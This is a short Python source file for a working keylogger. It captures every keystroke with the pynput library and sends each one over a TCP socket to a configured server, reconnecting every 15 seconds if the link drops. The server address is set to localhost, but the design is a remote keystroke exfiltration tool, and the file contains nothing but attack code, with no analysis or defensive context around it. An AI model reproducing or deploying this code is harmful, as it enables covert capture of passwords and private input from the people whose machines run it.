from pynput.keyboard import Key, Listener
import socket
import time

# Attempt to connect to server every 15 seconds
def initConn():
    global client
    client = socket.socket()
    while True:
        try:
            client.connect((SERVER_HOST, SERVER_PORT))
            break
        except Exception as err:
            print(err)
            time.sleep(15)
            pass
    print("Connection has been established!")

# Send keystrokes to server
def on_press(key):
    try:
        client.send((str(key)).encode())
    except WindowsError as err:
        print(err)
        client.close()
        initConn()

# Connect to server and capture keystrokes
if __name__ == '__main__':
    SERVER_HOST = '127.0.0.1'
    SERVER_PORT = 47620
    initConn()
    with Listener(on_press=on_press) as listener:
        listener.join()
